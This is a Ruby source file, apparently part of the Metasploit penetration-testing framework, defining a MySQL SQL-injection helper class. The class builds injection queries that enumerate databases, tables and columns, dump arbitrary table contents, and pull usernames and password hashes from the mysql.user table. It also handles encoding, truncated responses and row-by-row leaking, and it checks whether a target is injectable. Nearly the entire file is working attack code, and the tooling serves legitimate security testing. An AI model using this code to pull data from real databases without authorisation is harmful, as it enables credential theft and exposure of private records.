# coding: ascii-8bit

require 'base64'

#
# This class represents a MySQL Injection object, its primary purpose is to provide the common queries
# needed when performing SQL injection.
# Instanciate it only if you get the query results of your SQL injection returned on the response.
#
class Msf::Exploit::SQLi::MySQLi < Msf::Exploit::SQLi::SQLi
  #
  # Encoders supported by MySQL
  # Keys are mysql function names, values are decoding procs in Ruby
  #
  Encoders = {
    base64: {
      encode: 'to_base64(^DATA^)',
      decode: proc { |data| Base64.decode64(data) }
    },
    hex: {
      encode: 'hex(^DATA^)',
      decode: proc { |data| Rex::Text.hex_to_raw(data) }
    }
  }.freeze
  #
  #   See SQLi#initialize
  #
  def initialize(opts, &query_proc)
    if opts[:encoder].is_a?(String) || opts[:encoder].is_a?(Symbol)
      # if it's a String or a Symbol, use a predefined encoder if it exists
      opts[:encoder] = opts[:encoder].downcase.intern
      opts[:encoder] = Encoders[opts[:encoder]] if Encoders[opts[:encoder]]
    end
    super
  end

  #
  #   Execute the SQL query and return its results
  #   @param query [String] The SQL query to execute
  #   @return [String] The query results
  #
  def run_sql(query)
    super
  end

  #
  #   Query the MySQL version
  #   @return [String] The MySQL version in use
  #
  def version
    call_function('version()')
  end

  #
  #   Query the current database name
  #   @return [String] The name of the current database
  #
  def current_database
    call_function('database()')
  end

  #
  #   Query the current user
  #   @return [String] The username of the current user
  #
  def current_user
    call_function('user()')
  end

  #
  #   Query the names of all the existing databases
  #   @return [Array] An array of Strings, the database names
  #
  def enum_database_names
    dump_table_fields('information_schema', 'schemata', %w[schema_name]).flatten
  end

  #
  #   Query the character encoding of the given database
  #   @param database [String] the name of a database, or a function call, like database() for the current database
  #   @return [String] The character encoding, or nil if the database does not exist, or another error occurs
  #
  def enum_database_encoding(database)
    dump_table_fields('information_schema', 'schemata', %w[DEFAULT_CHARACTER_SET_NAME],
                      "SCHEMA_NAME=#{database.include?('(') ? database : "'" + database + "'"}").flatten[0]
  end

  #
  #   Query the names of the tables in a given database
  #   @param database [String] the name of a database, or a function call, like database() for the current database
  #   @return [Array] An array of Strings, the table names in the given database
  #
  def enum_table_names(database)
    dump_table_fields('information_schema', 'tables', %w[table_name],
                      "table_schema=#{database.include?('(') ? database : "'" + database + "'"}").flatten
  end

  def enum_view_names(database)
    dump_table_fields('information_schema', 'views', %w[table_name], "table_schema=#{database.include?('(') ? database : "'" + database + "'"}").flatten
  end

  #
  # Query the mysql users (their username and password), this might require root privileges.
  # @return [Array] an array of arrays representing rows, where each row contains two strings, the username and password
  #
  def enum_dbms_users
    # might require root privileges
    dump_table_fields('mysql', 'user', %w[User Password])
  end

  #
  #   Query the column names of the given table in the given database
  #   @param database [String] the name of a database, or a function call, like database() for the current database
  #   @param table_name [String] the name of the table of which you want to query the column names
  #   @return [Array] An array of Strings, the column names in the given table belonging to the given database
  #
  def enum_table_columns(database, table_name)
    dump_table_fields('information_schema', 'columns', %w[column_name],
                      "table_name='#{table_name}' and " \
                      "table_schema=#{database.include?('(') ? database : "'" + database + "'"}").flatten
  end

  #
  #  Query the given columns of the records of the given table, that satisfy an optional condition
  #  @param database [String] The database to query
  #  @param table [String]  The name of the table to query
  #  @param columns [Array] The names of the columns to query
  #  @param condition [String] An optional condition, return only the rows satisfying it
  #  @param limit [Integer] An optional maximum number of results to return
  #  @return [Array] An array, where each element is an array of strings representing a row of the results
  #
  def dump_table_fields(database, table, columns, condition = '', num_limit = 0)
    return '' if columns.empty?

    one_column = columns.length == 1
    if one_column
      columns = "ifnull(#{columns.first},'#{@null_replacement}')"
      columns = @encoder[:encode].sub(/\^DATA\^/, columns) if @encoder
    else
      columns = "concat_ws('#{@second_concat_separator}'," + columns.map do |col|
        col = "ifnull(#{col},'#{@null_replacement}')"
        @encoder ? @encoder[:encode].sub(/\^DATA\^/, col) : col
      end.join(',') + ')'
    end
    if database == 'database()'
      database = ''
    else
      database += '.'
    end
    unless condition.empty?
      condition = ' where ' + condition
    end
    num_limit = num_limit.to_i
    limit = num_limit > 0 ? ' limit ' + num_limit.to_s : ''
    retrieved_data = nil
    if @safe
      # no group_concat, leak one row at a time
      row_count = run_sql("select count(1) from #{database}#{table}#{condition}").to_i
      num_limit = row_count if num_limit == 0 || row_count < num_limit
      retrieved_data = num_limit.times.map do |current_row|
        if @truncation_length
          truncated_query("select mid(cast(#{columns} as binary),^OFFSET^,#{@truncation_length}) from " \
          "#{database}#{table}#{condition} limit #{current_row},1")
        else
          run_sql("select cast(#{columns} as binary) from #{database}#{table}#{condition} limit #{current_row},1")
        end
      end
    else
      # if limit > 0, an alias will be necessary
      if num_limit > 0
        alias1, alias2 = 2.times.map { Rex::Text.rand_text_alpha(rand(2..9)) }
        if @truncation_length
          retrieved_data = truncated_query('select mid(group_concat(' \
          "#{alias1}#{@concat_separator ? " separator '" + @concat_separator + "'" : ''}),"\
          "^OFFSET^,#{@truncation_length}) from (select cast(#{columns} as binary) #{alias1} from #{database}#{table}"\
          "#{condition}#{limit}) #{alias2}")
        else
          retrieved_data = run_sql("select group_concat(#{alias1}#{@concat_separator ? " separator '" + @concat_separator + "'" : ''})"\
          " from (select cast(#{columns} as binary) #{alias1} from #{database}#{table}#{condition}#{limit}) #{alias2}")
        end
      else
        if @truncation_length
          retrieved_data = truncated_query('select mid(group_concat(' \
          "cast(#{columns} as binary)#{@concat_separator ? " separator '" + @concat_separator + "'" : ''})," \
          "^OFFSET^,#{@truncation_length}) from #{database}#{table}#{condition}#{limit}")
        else
          retrieved_data = run_sql("select group_concat(cast(#{columns} as binary)#{@concat_separator ? " separator '" + @concat_separator + "'" : ''})" \
          " from #{database}#{table}#{condition}#{limit}")
        end
      end
    end
    retrieved_data.split(@concat_separator || ',').map do |row|
      row = row.split(@second_concat_separator)
      @encoder ? row.map { |x| @encoder[:decode].call(x) } : row
    end
  end

  #
  # Checks if the target is vulnerable (if the SQL injection is working fine), by checking that
  # queries that should return known results return the results we expect from them
  #
  def test_vulnerable
    random_string_len = @truncation_length ? [rand(2..10), @truncation_length].min : rand(2..10)
    random_string = Rex::Text.rand_text_alphanumeric(random_string_len)
    run_sql("select '#{random_string}'") == random_string
  end

  private

  #
  #  Helper method used in cases where the response is truncated.
  #  @param query [String] The SQL query to execute, where ^OFFSET^ will be replaced with an integer offset for querying
  #  @return [String] The query result
  #
  def truncated_query(query)
    result = [ ]
    offset = 1
    loop do
      slice = run_sql(query.sub(/\^OFFSET\^/, offset.to_s))
      offset += @truncation_length # should be same as @truncation_length for most cases
      result << slice
      if @verbose
        sign = { -1 => '<', 0 => '=', 1 => '>' }[slice.length <=> @truncation_length]
        puts "[+] Truncated output: #{slice} of size #{slice.size} #{sign} #{@truncation_length}"
      end
      puts "[*] Warning : The block returned a string larger than the truncation size : #{slice}" if slice.length > @truncation_length
      break if slice.length < @truncation_length
    end
    result.join
  end

  #
  # Checks the options specific to MySQL
  #
  def check_opts(opts)
    unless opts[:encoder].nil? || opts[:encoder].is_a?(Hash) || Encoders[opts[:encoder].downcase.intern]
      raise ArgumentError, 'Unsupported encoder'
    end

    super
  end

  def call_function(function)
    function = @encoder[:encode].sub(/\^DATA\^/, function) if @encoder
    output = nil
    if @truncation_length
      output = truncated_query("select mid(#{function},^OFFSET^,#{@truncation_length})")
    else
      output = run_sql("select #{function}")
    end
    output = @encoder[:decode].call(output) if @encoder
    output
  end
end

require 'msf/core/exploit/sqli/mysqli/boolean_based_blind'
require 'msf/core/exploit/sqli/mysqli/time_based_blind'
